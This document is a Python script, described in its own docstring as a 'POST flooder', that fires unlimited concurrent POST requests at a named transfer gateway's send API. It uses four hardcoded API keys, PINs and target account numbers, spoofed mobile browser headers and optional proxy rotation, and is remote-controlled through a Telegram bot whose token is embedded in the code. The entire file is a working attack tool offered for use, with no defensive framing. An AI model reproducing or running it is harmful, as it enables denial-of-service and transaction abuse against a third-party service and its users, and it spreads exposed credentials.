#!/usr/bin/env python3
"""
Stable POST flooder for txg-gateway.xyz with Telegram bot control.
4 API keys with multiple target numbers, auto‑rotation.
"""
import asyncio
import aiohttp
import json
import random
import time
import signal
import sys
import logging
import os
from aiohttp import web

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─── LOGGING ──────────────────────────────────────────────
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── TELEGRAM CONFIG (env overrides) ────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fXDo")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8401097557"))

# ─── ATTACK CONFIG ──────────────────────────────────────
# 4 API keys with multiple target numbers
CONFIGS = [
    {
        "api_key": "86864a72c5e2f3ad32c1c8f52710959f",
        "toUsers": ["6283146815", "9359202969", "9359202968"],
        "secret_pin": "1234",
        "remark": "Ultra pelo",
    },
    {
        "api_key": "f692ed462bc0976b5332a11944103df7",
        "toUsers": ["9359202969", "9359202968", "9359202967"],
        "secret_pin": "1234",
        "remark": "Ultra pelo",
    },
    {
        "api_key": "befd28e1b9ba8557fb7f192fc1647e12",
        "toUsers": ["9359202967", "6283146815", "9359202969"],
        "secret_pin": "1234",
        "remark": "TXG PELO",
    },
    {
        "api_key": "ecc00db3db1ed5e9df931ff19cd74b58",
        "toUsers": ["9359202967", "6283146815", "9359202968"],
        "secret_pin": "1234",
        "remark": "TXG PELO",
    }
]

URL = "https://txg-gateway.xyz/client/api/send.php"

BASE_HEADERS = {
    "Host": "txg-gateway.xyz",
    "sec-ch-ua-platform": '"Android"',
    "User-Agent": "Mozilla/5.0 (Linux; Android 16; CPH2729 Build/BP2A.250605.015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.7922.199 Mobile Safari/537.36",
    "sec-ch-ua": '"Not=A?Brand";v="99", "Android WebView";v="151", "Chromium";v="151"',
    "Content-Type": "application/json",
    "sec-ch-ua-mobile": "?1",
    "Accept": "*/*",
    "Origin": "https://txg-gateway.xyz",
    "X-Requested-With": "inha.gcu.ee",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "Referer": "https://txg-gateway.xyz/dashboard/send.php",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
    "Priority": "u=1, i",
}

# ─── PERFORMANCE SETTINGS ──────────────────────────────
CONCURRENT = 300               # parallel requests (adjust for Railway)
TOTAL_REQUESTS = 0             # 0 = infinite
USE_PROXIES = False
PROXY_FILE = "proxies.txt"

# ─── GLOBAL STATS ──────────────────────────────────────
stats = {'sent': 0, 'ok': 0, 'fail': 0}
lock = asyncio.Lock()
start_time = time.time()
flooder_running = True
flooder_task_obj = None

# ─── PROXY LOADER (optional) ───────────────────────────
def load_proxies():
    try:
        with open(PROXY_FILE) as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        return []

# ─── ASYNC REQUEST WORKER ──────────────────────────────
async def fire(session, sem, config, proxy=None):
    async with sem:
        # Random target from the key's list
        to_user = random.choice(config["toUsers"])
        headers = {**BASE_HEADERS, "Cookie": f"api_key={config['api_key']}"}
        payload = {
            "toUser": to_user,
            "amount": 1,
            "api_key": config["api_key"],
            "secret_pin": config["secret_pin"],
            "remark": config["remark"],
            "public": True,
            "manual": False,
        }
        try:
            async with session.post(URL, json=payload, headers=headers, proxy=proxy, ssl=False, timeout=5) as resp:
                status = resp.status
                # read response to avoid warnings
                await resp.text()
            async with lock:
                stats['sent'] += 1
                if 200 <= status < 400:
                    stats['ok'] += 1
                else:
                    stats['fail'] += 1
        except Exception:
            async with lock:
                stats['sent'] += 1
                stats['fail'] += 1

# ─── MAIN FLOODER LOOP ──────────────────────────────────
async def flooder_loop():
    global flooder_running
    proxies = load_proxies() if USE_PROXIES else []
    sem = asyncio.Semaphore(CONCURRENT)
    connector = aiohttp.TCPConnector(limit=CONCURRENT * 2, limit_per_host=CONCURRENT, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = set()
        count = 0
        logger.info("Flooder started, sending POST requests...")
        while flooder_running and (TOTAL_REQUESTS == 0 or count < TOTAL_REQUESTS):
            config = random.choice(CONFIGS)
            proxy = random.choice(proxies) if proxies else None
            task = asyncio.create_task(fire(session, sem, config, proxy))
            tasks.add(task)
            count += 1

            # Limit task accumulation to avoid memory leak
            if len(tasks) > CONCURRENT * 2:
                done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
                tasks = set(tasks)

            # Yield control to event loop
            await asyncio.sleep(0)

        # Wait for remaining tasks
        if tasks:
            await asyncio.wait(tasks, timeout=10)
        logger.info("Flooder stopped.")

# ─── TELEGRAM BOT COMMANDS ──────────────────────────────
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text(
        "✅ Flooder is active.\n"
        "Commands:\n"
        "/status – show live stats\n"
        "/stop – stop the flood\n"
        "/startflood – restart flood (resets stats)"
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    elapsed = time.time() - start_time
    rate = stats['sent'] / elapsed if elapsed > 0 else 0
    msg = (f"📊 **Live Stats**\n"
           f"📤 Sent: {stats['sent']}\n"
           f"✅ OK: {stats['ok']}\n"
           f"❌ Errors: {stats['fail']}\n"
           f"⏱️ Uptime: {int(elapsed)}s\n"
           f"⚡ Avg Rate: {rate:.1f} req/s\n"
           f"🔄 Running: {'Yes' if flooder_running else 'No'}")
    await update.message.reply_text(msg)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running
    if update.effective_user.id != ADMIN_ID:
        return
    if not flooder_running:
        await update.message.reply_text("⚠️ Already stopped.")
        return
    flooder_running = False
    await update.message.reply_text("🛑 Stopping flooder gracefully...")

async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global flooder_running, start_time, flooder_task_obj, stats
    if update.effective_user.id != ADMIN_ID:
        return
    if flooder_running:
        await update.message.reply_text("⚠️ Already running.")
        return
    flooder_running = True
    start_time = time.time()
    stats['sent'] = 0
    stats['ok'] = 0
    stats['fail'] = 0
    flooder_task_obj = asyncio.create_task(flooder_loop())
    await update.message.reply_text("▶️ Flooder started.")

# ─── PERIODIC AUTO‑REPORT ──────────────────────────────
async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
    if not flooder_running:
        return
    elapsed = time.time() - start_time
    rate = stats['sent'] / elapsed if elapsed > 0 else 0
    msg = (f"📊 **Auto Report**\n"
           f"📤 Sent: {stats['sent']}\n"
           f"✅ OK: {stats['ok']}\n"
           f"❌ Errors: {stats['fail']}\n"
           f"⚡ Rate: {rate:.1f} req/s")
    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)

# ─── HEALTH CHECK WEB SERVER (for Railway) ─────────────
async def health(request):
    return web.Response(text="Flooder is online", status=200)

async def run_webserver():
    app = web.Application()
    app.router.add_get('/', health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host='0.0.0.0', port=int(os.getenv("PORT", "8080")))
    await site.start()
    logger.info("Web server started on port %s", os.getenv("PORT", "8080"))
    # Keep the server running
    await asyncio.Event().wait()

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    global flooder_task_obj
    # Start flooder
    flooder_task_obj = asyncio.create_task(flooder_loop())

    # Start Telegram bot
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("startflood", start_flooder))

    job_queue = app.job_queue
    if job_queue:
        job_queue.run_repeating(send_periodic_report, interval=30, first=10)

    # Send startup notification
    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder online** – 4 keys, multiple targets.\n/status for stats, /stop to halt.")

    # Start bot polling and web server concurrently
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    # Run web server alongside
    try:
        await asyncio.gather(
            run_webserver(),
            asyncio.Event().wait()  # keep main alive
        )
    except asyncio.CancelledError:
        pass
    finally:
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    def signal_handler(sig, frame):
        global flooder_running
        logger.info("Shutting down...")
        flooder_running = False
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Exiting.")
